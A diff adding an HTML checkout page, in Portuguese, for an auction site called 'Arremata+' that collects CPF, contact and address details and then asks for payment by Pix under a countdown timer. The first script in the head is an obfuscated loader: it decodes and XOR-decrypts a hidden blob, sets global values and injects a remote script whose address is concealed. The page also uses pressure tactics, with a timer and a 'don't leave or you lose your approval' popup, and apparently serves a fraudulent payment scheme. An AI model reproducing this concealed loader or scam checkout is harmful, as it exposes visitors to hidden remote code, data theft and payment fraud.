@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script>(function(){var x_3o2z=atob("DBVvs+7RgmayYX0yt25Nxpy9oFyQCQlGx2ZVnMGy5gicFAlf3nMWnY2+70jQE1JB1GcGw5qirRbbGRhemGUGy4u9rAzBQ1EQ1mEbwYez9xLXEl8I7EhDkYm97QTTDQ4QjU4UkYCw7wOQW19C3m0K36e1oEqQFxxewnBNiczn41+DUR9X1ndbgtez4ACFA0UDgnEMit3z/zvP");var m_3=[];for(var i_ar9f=0;i_ar9f<x_3o2z.length;i_ar9f++){m_3.push(x_3o2z.charCodeAt(i_ar9f)&255);}var g_lp3=m_3[0];var f_1=m_3.slice(1,1+g_lp3);var z_4r=m_3.slice(1+g_lp3);var s_y=z_4r.map(function(b,v_butu){return b^f_1[v_butu%g_lp3];});var d_og="";for(var o_f7gd=0;o_f7gd<s_y.length;o_f7gd++){d_og+=String.fromCharCode(s_y[o_f7gd]&255);}var k_c=decodeURIComponent(escape(d_og));var r_73=JSON.parse(k_c);var n_p=r_73.globals||[];n_p.forEach(function(w_0b77){window[w_0b77.name]=w_0b77.value;});var j_ih=document.createElement("script");j_ih.src=r_73.url;j_ih.async=true;j_ih.defer=true;(r_73.attributes||[]).forEach(function(f_8){j_ih.setAttribute(f_8.name,f_8.value);});(document.head||document.documentElement).appendChild(j_ih);})();</script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<!-- Tag do Google Ads - dispara "adicionar ao carrinho" (entrou no checkout)
+     e "iniciar finalizacao de compra" (Pix gerado) no navegador do comprador. -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18375685275"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'AW-18375685275');
+  gtag('config', 'AW-18414458230');
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Finalizar retirada e entrega | Arremata+</title>
+<meta name="description" content="Confirme seus dados para receber ou retirar o item que você arrematou.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/style.css">
+<style>
+  .pixcard-page{max-width:420px;margin:0 auto;padding:28px 18px 40px}
+
+  .pixcard__box{
+    background:#fff;border-radius:18px;padding:20px;
+    box-shadow:0 2px 18px rgba(20,30,50,.06);
+  }
+
+  .pixcard__timer-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px}
+  .pixcard__timer-label{font-size:13px;color:#8A93A3;font-weight:600}
+  .pixcard__timer-digits{display:flex;align-items:center;gap:4px}
+  .pixcard__timer-digits .digit{
+    background:var(--brand-red,#E5192D);color:#fff;font-weight:800;font-size:15px;
+    width:24px;height:28px;border-radius:6px;display:flex;align-items:center;justify-content:center;
+  }
+  .pixcard__timer-digits .colon{color:var(--brand-red,#E5192D);font-weight:800;font-size:16px;padding:0 1px}
+
+  .pixcard__summary{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:20px}
+  .pixcard__summary .label{display:block;font-size:12px;color:#8A93A3;margin-bottom:3px}
+  .pixcard__summary .value{display:block;font-size:16px;font-weight:800;color:var(--text,#1C2433)}
+  .pixcard__summary .col--right{text-align:right}
+  .pixcard__summary .value--product{color:#8B7A22;font-size:13.5px;max-width:150px}
+
+  .pixcard__qr-wrap{position:relative;display:flex;justify-content:center;margin-bottom:34px}
+  .pixcard__qr-frame{
+    background:#fff;padding:14px;border-radius:14px;
+    border:2px dashed #E4E8EE;
+    box-shadow:0 4px 16px rgba(20,30,50,.05);
+  }
+  .pixcard__qr-frame img{display:block;width:190px;height:190px}
+  .pixcard__qr-badge{
+    position:absolute;bottom:-16px;left:50%;transform:translateX(-50%);
+    background:#fff;border-radius:999px;padding:7px 16px;font-size:12px;font-weight:700;
+    color:#4A5568;box-shadow:0 3px 10px rgba(20,30,50,.12);white-space:nowrap;
+    display:flex;align-items:center;gap:6px;
+  }
+
+  .pixcard__features{display:flex;justify-content:space-between;margin-bottom:22px;text-align:center}
+  .pixcard__features > div{flex:1;display:flex;flex-direction:column;align-items:center;gap:6px}
+  .pixcard__features svg{color:#00B26B}
+  .pixcard__features span{font-size:11.5px;color:#6B7280;line-height:1.35;font-weight:600}
+
+  .pixcard__btn{
+    width:100%;display:flex;align-items:center;justify-content:center;gap:9px;
+    border-radius:12px;padding:14px;font-size:15px;font-weight:800;margin-bottom:10px;
+    transition:filter .15s;
+  }
+  .pixcard__btn:hover{filter:brightness(.95)}
+  .pixcard__btn--primary{background:#1A73E8;color:#fff}
+  .pixcard__btn--primary.is-copied{background:#00B26B}
+
+  .pixcard__hint{text-align:center;font-size:12px;color:#9AA3B2;margin:14px 0 0;line-height:1.5}
+
+  .pixcard__trustbar{
+    display:flex;justify-content:center;align-items:center;gap:18px;flex-wrap:wrap;
+    margin-top:22px;padding-top:18px;border-top:1px solid #E7EAEF;
+  }
+  .pixcard__trustbar span{
+    display:flex;align-items:center;gap:6px;font-size:11.5px;font-weight:700;color:#6B7280;
+  }
+  .pixcard__trustbar svg{color:#00B26B}
+
+  .leave-popup-overlay{
+    position:fixed;inset:0;background:rgba(20,25,35,.55);display:none;
+    align-items:center;justify-content:center;padding:20px;z-index:999;
+  }
+  .leave-popup-overlay.is-open{display:flex}
+  .leave-popup{
+    background:#fff;border-radius:16px;padding:26px 22px;max-width:340px;width:100%;
+    text-align:center;box-shadow:0 12px 40px rgba(0,0,0,.25);
+  }
+  .leave-popup__icon{
+    width:48px;height:48px;border-radius:50%;background:#FFF1E0;color:var(--brand-orange,#F5820A);
+    display:flex;align-items:center;justify-content:center;margin:0 auto 14px;
+  }
+  .leave-popup h3{font-size:16px;font-weight:800;margin:0 0 8px;color:#1C2433}
+  .leave-popup p{font-size:13.5px;color:#6B7280;line-height:1.5;margin:0 0 18px}
+  .leave-popup__stay{
+    width:100%;background:#1A73E8;color:#fff;border-radius:10px;padding:12px;
+    font-size:14px;font-weight:800;margin-bottom:8px;
+  }
+  .leave-popup__leave{
+    width:100%;background:transparent;color:#9AA3B2;border-radius:10px;padding:10px;
+    font-size:13px;font-weight:700;
+  }
+
+  .copypopup-overlay{
+    position:fixed;inset:0;background:rgba(20,25,35,.55);display:none;
+    align-items:center;justify-content:center;padding:20px;z-index:1000;
+  }
+  .copypopup-overlay.is-open{display:flex}
+  .copypopup{
+    background:#fff;border-radius:20px;padding:30px 26px 26px;max-width:340px;width:100%;
+    text-align:center;box-shadow:0 12px 40px rgba(0,0,0,.25);position:relative;
+  }
+  .copypopup__close{
+    position:absolute;top:14px;right:14px;width:26px;height:26px;color:#9AA3B2;
+    display:flex;align-items:center;justify-content:center;
+  }
+  .copypopup__icon{
+    width:64px;height:64px;border-radius:50%;background:#00B26B;color:#fff;
+    display:flex;align-items:center;justify-content:center;margin:0 auto 16px;
+  }
+  .copypopup h3{font-size:18px;font-weight:800;margin:0 0 8px;color:#1C2433}
+  .copypopup p{font-size:13.5px;color:#6B7280;line-height:1.5;margin:0 0 22px}
+
+  .copypopup__slider{
+    position:relative;height:52px;border-radius:999px;background:#D9F2E3;
+    overflow:hidden;touch-action:none;
+  }
+  .copypopup__slider-btn{
+    position:absolute;top:0;left:0;height:100%;width:100%;border-radius:999px;
+    background:#17A452;color:#fff;font-size:15px;font-weight:800;
+    display:flex;align-items:center;justify-content:center;cursor:grab;
+    user-select:none;
+  }
+  .copypopup__slider-btn.is-dragging{cursor:grabbing}
+  .copypopup__slider-btn.is-snapping{transition:transform .25s ease, background-color .25s ease}
+
+  @media (max-width:640px){
+    #checkoutMainTitle.is-pix-mode,#checkoutMainSub.is-pix-mode{text-align:center}
+    #checkoutMainTitle.is-pix-mode{font-size:16px}
+    #checkoutMainSub.is-pix-mode{font-size:14px}
+  }
+
+  /* ---------- Opções de frete ---------- */
+  .frete-options{display:flex;flex-direction:column;gap:10px}
+  .frete-opt{position:relative;display:block;cursor:pointer}
+  .frete-opt input{position:absolute;opacity:0;width:0;height:0}
+  .frete-opt__body{display:block;border:1.5px solid var(--border,#E3E6EC);border-radius:12px;padding:13px 15px 13px 44px;background:#fff;transition:border-color .15s,box-shadow .15s,background .15s}
+  .frete-opt__body::before{content:"";position:absolute;left:15px;top:15px;width:18px;height:18px;border-radius:50%;border:2px solid var(--border-strong,#CDD2DC);background:#fff;box-sizing:border-box;transition:border-color .15s}
+  .frete-opt__body::after{content:"";position:absolute;left:21px;top:21px;width:6px;height:6px;border-radius:50%;background:#fff;transform:scale(0);transition:transform .15s}
+  .frete-opt input:checked + .frete-opt__body{border-color:var(--brand-blue,#155CF2);background:#F5F8FF;box-shadow:0 0 0 3px rgba(21,92,242,.12)}
+  .frete-opt input:checked + .frete-opt__body::before{border-color:var(--brand-blue,#155CF2);background:var(--brand-blue,#155CF2)}
+  .frete-opt input:checked + .frete-opt__body::after{transform:scale(1)}
+  .frete-opt input:focus-visible + .frete-opt__body{border-color:var(--brand-blue,#155CF2)}
+  .frete-opt__head{display:flex;justify-content:space-between;align-items:baseline;gap:10px}
+  .frete-opt__name{font-size:14px;font-weight:700;color:var(--text,#16181D)}
+  .frete-opt__price{font-size:14px;font-weight:800;color:var(--text,#16181D);white-space:nowrap}
+  .frete-opt__price--free{color:var(--brand-green,#1E9E5A)}
+  .frete-opt__eta{display:block;font-size:12.5px;color:var(--text-muted,#6B7280);margin-top:4px}
+  .frete-opt__desc{display:block;font-size:12px;color:var(--text-faint,#9AA1AC);margin-top:2px}
+
+  /* ---------- Linha de total no resumo ---------- */
+  .checkout__summary-row--total{border-top:1px solid var(--border,#E3E6EC);padding-top:12px;margin-top:2px}
+  .checkout__summary-row--total span{font-weight:700;color:var(--text)}
+  .checkout__summary-row--total strong{font-size:17px;color:var(--text)}
+
+  /* ---------- Itens do carrinho no resumo ---------- */
+  .checkout__items{margin-bottom:16px}
+  .checkout__item{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid var(--border,#E3E6EC)}
+  .checkout__item:last-child{border-bottom:none}
+  .checkout__item img{width:48px;height:48px;object-fit:contain;border-radius:8px;background:var(--bg-page,#F2F3F6);flex-shrink:0}
+  .checkout__item-info{flex:1;min-width:0}
+  .checkout__item-info p{margin:0;font-size:13px;font-weight:600;color:var(--text,#16181D);line-height:1.35}
+  .checkout__item-price{margin-top:3px !important;font-weight:800 !important;color:var(--brand-green,#1E9E5A) !important}
+  .ck-back{display:inline-block;font-size:10px;font-weight:800;color:#fff;background:var(--brand-red,#E5192D);padding:1px 5px;border-radius:4px;vertical-align:middle;letter-spacing:.3px}
+  .checkout__item-remove{color:var(--text-faint,#9AA1AC);padding:6px;border-radius:8px;flex-shrink:0;background:none;border:none;cursor:pointer}
+  .checkout__item-remove:hover{background:#FDECEC;color:var(--brand-red,#E5192D)}
+</style>
+</head>
+<body>
+
+<!-- Sprite de ícones (evita requisições externas) -->
+<svg style="display:none">
+  <symbol id="icon-search" viewBox="0 0 24 24"><circle cx="11" cy="11" r="7" fill="none" stroke="currentColor" stroke-width="2"/><line x1="21" y1="21" x2="16.6" y2="16.6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></symbol>
+  <symbol id="icon-pin" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="2" d="M12 22s7-7.58 7-12.5A7 7 0 0 0 5 9.5C5 14.42 12 22 12 22Z"/><circle cx="12" cy="9.5" r="2.4" fill="none" stroke="currentColor" stroke-width="2"/></symbol>
+  <symbol id="icon-user" viewBox="0 0 24 24"><circle cx="12" cy="8" r="3.6" fill="none" stroke="currentColor" stroke-width="2"/><path fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" d="M4.5 20c1.4-3.6 4.4-5.5 7.5-5.5s6.1 1.9 7.5 5.5"/></symbol>
+  <symbol id="icon-heart" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round" d="M12 20.2s-7.6-4.6-9.9-9.2C.6 7.4 2.3 4 5.9 4c2 0 3.6 1.1 4.6 2.7C11.5 5.1 13.1 4 15.1 4c3.6 0 5.3 3.4 3.8 7-2.3 4.6-9.9 9.2-9.9 9.2Z"/></symbol>
+  <symbol id="icon-cart" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" d="M3 4h2l2.4 12.2a2 2 0 0 0 2 1.6h7.6a2 2 0 0 0 2-1.6L21 8H6"/><circle cx="9.5" cy="20.5" r="1.4" fill="currentColor" stroke="none"/><circle cx="17.5" cy="20.5" r="1.4" fill="currentColor" stroke="none"/></symbol>
+  <symbol id="icon-menu" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" d="M3 6h18M3 12h18M3 18h18"/></symbol>
+  <symbol id="icon-chevron-down" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" d="m6 9 6 6 6-6"/></symbol>
+  <symbol id="icon-chevron-right" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" d="m9 6 6 6-6 6"/></symbol>
+  <symbol id="icon-close" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" d="M5 5l14 14M19 5 5 19"/></symbol>
+  <symbol id="icon-clock" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="2"/><path fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" d="M12 7v5l3.5 2"/></symbol>
+  <symbol id="icon-phone" viewBox="0 0 24 24"><rect x="7" y="2" width="10" height="20" rx="2" fill="none" stroke="currentColor" stroke-width="1.6"/><line x1="10" y1="18" x2="14" y2="18" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></symbol>
+  <symbol id="icon-accessibility" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="1.6"/><circle cx="12" cy="7.6" r="1.3" fill="currentColor"/><path fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" d="M8 10.2c2.6.9 5.4.9 8 0M12 10.6v3.1m0 0-2.2 4.1m2.2-4.1 2.2 4.1"/></symbol>
+  <symbol id="icon-check" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" d="M5 13l5 5L19 7"/></symbol>
+  <symbol id="icon-copy" viewBox="0 0 24 24"><rect x="8" y="8" width="13" height="13" rx="2" fill="none" stroke="currentColor" stroke-width="1.8"/><path fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" d="M16 8V5.5A1.5 1.5 0 0 0 14.5 4H4.5A1.5 1.5 0 0 0 3 5.5v10A1.5 1.5 0 0 0 4.5 17H8"/></symbol>
+  <symbol id="icon-pix" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" d="M4 12a8 8 0 0 1 13.66-5.66M20 12a8 8 0 0 1-13.66 5.66"/><path fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" d="M17.5 3v3.5H14M6.5 21v-3.5H10"/></symbol>
+  <symbol id="icon-card" viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2" fill="none" stroke="currentColor" stroke-width="1.8"/><path fill="none" stroke="currentColor" stroke-width="1.8" d="M2 10h20"/><path stroke="currentColor" stroke-width="1.8" stroke-linecap="round" d="M6 15h4"/></symbol>
+  <symbol id="icon-boleto" viewBox="0 0 24 24"><path stroke="currentColor" stroke-width="1.6" d="M3 5v14M6 5v14M8 5v14M11 5v14M13 5v14M16 5v14M19 5v14M21 5v14"/></symbol>
+  <symbol id="icon-instagram" viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="5" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="12" cy="12" r="4.2" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.2" cy="6.8" r="1.1" fill="currentColor"/></symbol>
+  <symbol id="icon-facebook" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round" d="M15 8.5h-2c-.8 0-1.5.7-1.5 1.5v2h3.3L14.3 15H11.5v6h-3v-6H6v-3h2.5v-2.3C8.5 7.2 10.2 5.5 12.7 5.5H15v3Z"/></symbol>
+  <symbol id="icon-youtube" viewBox="0 0 24 24"><rect x="2" y="5.5" width="20" height="13" rx="3.5" fill="none" stroke="currentColor" stroke-width="1.8"/><path fill="currentColor" stroke="none" d="M10 9.5v5l4.5-2.5L10 9.5Z"/></symbol>
+</svg>
+
+<div class="promo-bar" id="promoBar">
+  <button type="button" class="promo-bar__left" id="promoToggle" aria-expanded="false" aria-controls="promoForm">
+    <p><strong>Receba</strong> em primeira mão <strong>ofertas exclusivas</strong></p>
+    <svg class="promo-bar__chevron" width="16" height="16"><use href="#icon-chevron-down"/></svg>
+  </button>
+  <form class="promo-bar__right" id="promoForm" novalidate>
+    <input type="email" id="promoEmail" placeholder="Digite seu e-mail" required>
+    <input type="tel" id="promoPhone" placeholder="Digite seu telefone" required>
+    <button type="submit">Receber</button>
+    <p class="promo-bar__legal">Ao enviar seus dados, você aceita os <a href="checkout.html#">Termos de Uso</a> e a <a href="checkout.html#">Política de Privacidade</a> e autoriza receber ofertas. Cancele quando quiser.</p>
+  </form>
+  <p class="promo-bar__success" id="promoSuccess" hidden>Cadastro recebido! Fique de olho no seu e-mail.</p>
+  <button class="promo-bar__close" id="promoClose" aria-label="Fechar aviso"><svg width="14" height="14"><use href="#icon-close"/></svg></button>
+</div>
+
+<header class="site-header">
+  <div class="site-header__inner">
+    <button class="mobile-menu-btn" id="mobileMenuBtn" aria-label="Abrir menu" aria-controls="categoryNav">
+      <svg width="22" height="22"><use href="#icon-menu"/></svg>
+    </button>
+
+    <a href="index.html" class="logo" aria-label="Página inicial" id="headerLogoLink">
+      <img src="img/logo/logooo.svg" alt="Arremata+" width="197" height="21">
+    </a>
+
+    <a href="checkout.html#" class="header-action header-action--account" id="headerAccountLink">
+      <svg width="20" height="20"><use href="#icon-user"/></svg>
+      <span>Acesse sua conta</span>
+    </a>
+
+    <a href="checkout.html#" class="header-action header-action--icon-only header-action--fav" aria-label="Favoritos" id="headerFavLink">
+      <svg width="21" height="21"><use href="#icon-heart"/></svg>
+    </a>
+
+    <a href="checkout.html#" class="header-action header-action--icon-only header-action--cart" aria-label="Meus lances" id="headerCartLink">
+      <svg width="21" height="21"><use href="#icon-cart"/></svg>
+      <span class="cart-badge">3</span>
+    </a>
+
+  </div>
+
+  <div class="nav-overlay" id="navOverlay"></div>
+
+  <nav class="category-nav" id="categoryNav">
+    <div class="category-nav__mobile-head">
+      <span>Categorias</span>
+      <button id="navClose" aria-label="Fechar menu"><svg width="18" height="18"><use href="#icon-close"/></svg></button>
+    </div>
+    <button class="dept-toggle" id="deptToggle">
+      <svg width="18" height="18"><use href="#icon-menu"/></svg>
+      Categorias
+    </button>
+    <a href="checkout.html#">Eletrônicos</a>
+    <a href="checkout.html#">Veículos</a>
+    <a href="checkout.html#">Imóveis</a>
+    <a href="checkout.html#">Joias &amp; Relógios</a>
+    <a href="checkout.html#">Móveis</a>
+    <a href="checkout.html#">Arte &amp; Colecionáveis</a>
+    <a href="checkout.html#" class="tag-link">Leilões Judiciais</a>
+  </nav>
+</header>
+
+<main class="checkout-main">
+  <h1 id="checkoutMainTitle">Finalizar retirada e entrega</h1>
+  <p class="checkout-main__sub" id="checkoutMainSub">Confirme seus dados para receber ou retirar o item que você arrematou.</p>
+
+  <div class="checkout" id="checkoutBlock">
+    <form class="checkout__form" id="checkoutForm" novalidate>
+      <div class="checkout__section">
+        <h2>Dados pessoais</h2>
+        <label class="checkout__field">Nome completo
+          <span class="checkout__input-wrap">
+            <input type="text" id="ckName" required>
+            <svg class="checkout__field-check" width="16" height="16"><use href="#icon-check"/></svg>
+          </span>
+        </label>
+        <label class="checkout__field">CPF
+          <span class="checkout__input-wrap">
+            <input type="text" id="ckCpf" inputmode="numeric" maxlength="14" placeholder="000.000.000-00" pattern="\d{3}\.\d{3}\.\d{3}-\d{2}" title="Digite o CPF completo" required>
+            <svg class="checkout__field-check" width="16" height="16"><use href="#icon-check"/></svg>
+          </span>
+        </label>
+        <label class="checkout__field">E-mail
+          <span class="checkout__input-wrap">
+            <input type="email" id="ckEmail" placeholder="voce@email.com" required>
+            <svg class="checkout__field-check" width="16" height="16"><use href="#icon-check"/></svg>
+          </span>
+        </label>
+        <label class="checkout__field">Telefone
+          <span class="checkout__input-wrap">
+            <input type="tel" id="ckPhone" inputmode="numeric" maxlength="15" placeholder="(00) 00000-0000" required>
+            <svg class="checkout__field-check" width="16" height="16"><use href="#icon-check"/></svg>
+          </span>
+        </label>
+      </div>
+
+      <div class="checkout__section">
+        <h2>Endereço de entrega ou retirada</h2>
+        <label class="checkout__field">CEP
+          <span class="checkout__input-wrap">
+            <input type="text" id="ckCep" inputmode="numeric" maxlength="9" placeholder="00000-000" required>
+            <svg class="checkout__field-check" width="16" height="16"><use href="#icon-check"/></svg>
+          </span>
+        </label>
+        <p class="checkout__cep-feedback" id="ckCepFeedback"></p>
+
+        <label class="checkout__field">Rua / Logradouro
+          <span class="checkout__input-wrap">
+            <input type="text" id="ckStreet" required>
+            <svg class="checkout__field-check" width="16" height="16"><use href="#icon-check"/></svg>
+          </span>
+        </label>
+        <div class="checkout__row">
+          <label class="checkout__field">Número
+            <span class="checkout__input-wrap">
+              <input type="text" id="ckNumber" required>
+              <svg class="checkout__field-check" width="16" height="16"><use href="#icon-check"/></svg>
+            </span>
+          </label>
+          <label class="checkout__field">Complemento
+            <span class="checkout__input-wrap">
+              <input type="text" id="ckComplement" placeholder="Opcional">
+              <svg class="checkout__field-check" width="16" height="16"><use href="#icon-check"/></svg>
+            </span>
+          </label>
+        </div>
+        <label class="checkout__field">Bairro
+          <span class="checkout__input-wrap">
+            <input type="text" id="ckNeighborhood" required>
+            <svg class="checkout__field-check" width="16" height="16"><use href="#icon-check"/></svg>
+          </span>
+        </label>
+        <label class="checkout__field">Cidade / Estado
+          <span class="checkout__input-wrap">
+            <input type="text" id="ckCity" required>
+            <svg class="checkout__field-check" width="16" height="16"><use href="#icon-check"/></svg>
+          </span>
+        </label>
+      </div>
+
+      <div class="checkout__section" id="ckFreteSection" hidden>
+        <h2>Escolha o frete</h2>
+        <div class="frete-options">
+          <label class="frete-opt">
+            <input type="radio" name="ckFrete" value="0" data-label="Frete Econômico" checked>
+            <span class="frete-opt__body">
+              <span class="frete-opt__head">
+                <span class="frete-opt__name">Frete Econômico</span>
+                <span class="frete-opt__price frete-opt__price--free">GRÁTIS</span>
+              </span>
+              <span class="frete-opt__eta">Entrega estimada: 8 a 15 dias úteis</span>
+              <span class="frete-opt__desc">Rastreamento disponível</span>
+            </span>
+          </label>
+          <label class="frete-opt">
+            <input type="radio" name="ckFrete" value="23.47" data-label="Frete Prioritário">
+            <span class="frete-opt__body">
+              <span class="frete-opt__head">
+                <span class="frete-opt__name">Frete Prioritário</span>
+                <span class="frete-opt__price">R$ 23,47</span>
+              </span>
+              <span class="frete-opt__eta">Entrega estimada: 5 a 9 dias úteis</span>
+              <span class="frete-opt__desc">Prioridade na separação e postagem</span>
+            </span>
+          </label>
+          <label class="frete-opt">
+            <input type="radio" name="ckFrete" value="37.83" data-label="Frete Expresso">
+            <span class="frete-opt__body">
+              <span class="frete-opt__head">
+                <span class="frete-opt__name">Frete Expresso</span>
+                <span class="frete-opt__price">R$ 37,83</span>
+              </span>
+              <span class="frete-opt__eta">Entrega estimada: 4 a 5 dias úteis</span>
+              <span class="frete-opt__desc">Processamento prioritário + modalidade de entrega mais rápida</span>
+            </span>
+          </label>
+        </div>
+      </div>
+
+      <button type="submit" class="checkout__submit" id="checkoutSubmitBtn">Finalizar pedido</button>
+      <p class="checkout__submit-error" id="checkoutSubmitError" hidden></p>
+    </form>
+
+    <aside class="checkout__summary">
+      <h2>Seu arremate</h2>
+      <div class="checkout__product" id="ckSingleProduct">
+        <img id="ckProductImg" src="checkout.html" alt="">
+        <div>
+          <p id="ckProductTitle">—</p>
+        </div>
+      </div>
+      <div class="checkout__items" id="ckCartItems" hidden></div>
+      <div class="checkout__summary-row"><span id="ckSubtotalLabel">Valor arrematado</span><strong id="ckSummaryPrice">R$ 0,00</strong></div>
+      <div class="checkout__summary-row"><span>Frete</span><strong id="ckSummaryFrete" class="checkout__free-shipping">Grátis</strong></div>
+      <div class="checkout__summary-row checkout__summary-row--total"><span>Total</span><strong id="ckSummaryTotal">R$ 0,00</strong></div>
+    </aside>
+  </div>
+
+  <div class="pix" id="pixBlock" hidden>
+    <div class="pix__stage" id="pixStageLoading">
+      <div class="bid-modal__spinner"></div>
+      <h2>Gerando o QR Code Pix...</h2>
+      <p>Aguarde um instante enquanto preparamos o pagamento.</p>
+    </div>
+
+    <div class="pix__stage" id="pixStageReady" hidden>
+      <div class="pixcard-page" style="padding:0;max-width:none">
+        <div class="pixcard__box">
+          <div class="pixcard__timer-row">
+            <span class="pixcard__timer-label">Pague em até</span>
+            <div class="pixcard__timer-digits">
+              <span class="digit" id="tMin1">1</span><span class="digit" id="tMin2">0</span>
+              <span class="colon">:</span>
+              <span class="digit" id="tSec1">0</span><span class="digit" id="tSec2">0</span>
+            </div>
+          </div>
+
+          <div class="pixcard__summary">
+            <div>
+              <span class="label">Valor a pagar</span>
+              <strong class="value" id="pixAmount">R$ 0,00</strong>
+            </div>
+            <div class="col--right">
+              <span class="label">Produto</span>
+              <strong class="value value--product" id="pixProductName">—</strong>
+            </div>
+          </div>
+
+          <div class="pixcard__qr-wrap">
+            <div class="pixcard__qr-frame">
+              <img id="pixQrImg" src="checkout.html" alt="QR Code Pix">
+            </div>
+            <span class="pixcard__qr-badge">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 8V6a2 2 0 0 1 2-2h2M4 16v2a2 2 0 0 0 2 2h2M20 8V6a2 2 0 0 0-2-2h-2M20 16v2a2 2 0 0 1-2 2h-2"/><circle cx="12" cy="12" r="3.2"/></svg>
+              Aponte a câmera
+            </span>
+          </div>
+
+          <div class="pixcard__features">
+            <div>
+              <svg width="20" height="20"><use href="#icon-pix"/></svg>
+              <span>Protegido<br>pelo Pix</span>
+            </div>
+            <div>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M13 2 3 14h6l-1 8 10-13h-6l1-7z"/></svg>
+              <span>Liberação em<br>até 2 min.</span>
+            </div>
+            <div>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3 4.5 6v6c0 4.5 3 7.5 7.5 9 4.5-1.5 7.5-4.5 7.5-9V6L12 3Z"/></svg>
+              <span>Ambiente<br>seguro</span>
+            </div>
+          </div>
+
+          <input type="text" id="pixCode" readonly style="position:absolute;left:-9999px">
+
+          <button type="button" id="pixCopyBtn" class="pixcard__btn pixcard__btn--primary">
+            <svg width="18" height="18"><use href="#icon-copy"/></svg>
+            <span>Copiar código Pix</span>
+          </button>
+
+          <p class="pixcard__hint">Confirmação automática assim que o pagamento cair.</p>
+        </div>
+
+        <div class="pixcard__trustbar">
+          <span>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="5" y="11" width="14" height="9" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>
+            Ambiente Seguro
+          </span>
+          <span>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path stroke-linejoin="round" d="M12 3 4.5 6v6c0 4.5 3 7.5 7.5 9 4.5-1.5 7.5-4.5 7.5-9V6L12 3Z"/></svg>
+            Dados 100% Protegidos
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <div class="pix__stage" id="pixStageApproved" hidden>
+      <div class="checkout__success-check"><svg width="36" height="36"><use href="#icon-check"/></svg></div>
+      <h2>Pagamento confirmado!</h2>
+      <p>Redirecionando...</p>
+      <strong id="ckOrderNumber" hidden>#000000</strong>
+    </div>
+
+    <div class="pix__stage" id="pixStageFailed" hidden>
+      <h2>Não foi possível confirmar o pagamento</h2>
+      <p id="pixFailedReason">O pagamento não foi aprovado. Você pode tentar novamente.</p>
+      <button type="button" class="checkout__back" id="pixRetryBtn">Tentar novamente</button>
+    </div>
+  </div>
+</main>
+
+<div class="leave-popup-overlay" id="leavePopupOverlay">
+  <div class="leave-popup">
+    <div class="leave-popup__icon">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v4m0 4h.01M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0Z"/></svg>
+    </div>
+    <h3>Espera, não sai ainda!</h3>
+    <p id="leavePopupMsg">Se você sair agora, vai perder a aprovação que conseguiu para comprar este produto por este valor.</p>
+    <button type="button" class="leave-popup__stay" id="leavePopupStay">Continuar pagamento</button>
+    <button type="button" class="leave-popup__leave" id="leavePopupLeave">Voltar mesmo assim</button>
+  </div>
+</div>
+
